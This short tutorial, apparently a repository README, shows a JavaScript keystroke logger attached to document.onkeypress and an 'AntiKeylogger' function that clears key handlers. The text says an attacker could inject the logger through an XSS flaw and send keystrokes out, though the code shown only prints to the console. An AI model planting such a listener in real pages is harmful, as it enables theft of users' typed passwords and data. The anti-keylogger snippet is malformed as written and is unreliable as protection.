**JavaScript Keylogger & Anti-Keylogger**
===

There has been lot of questions on this, and people are still confused like how to write a keylogger with Javascript, does it work ? So here it is.. an yes it works, basically it not a magic as such we just exploit the onkeypress() function here. If your wesite has an XSS vernuability attacker can attach an listener and send the keystrokes back to the service.

```js
// this will attach a listener to the onkeypress() event
document.onkeypress = function(e){ 
    window.keyp += e.key;  //we store the key into a window variable to create the complete word
    if(e.code === "Space") // we check for when space is pressed to print the word out in console
    { 
        console.log(window.keyp); //print
        window.keyp = ""; // we made the window variable null again
    } 
};
```
To overcome this we can have someting as AntiKeylogger and call it when the page is loaded
```js
//disables the keystroke logging 
function AntiKeylogger(){
    window.onkeydown = undefined;
    window.onkeypress = undefined;
    window.onkeyup = undefined;
    document.onkeydown = undefined;
    document.onkeypress = undefined;
    document.onkeyup = undefined;
}();
```
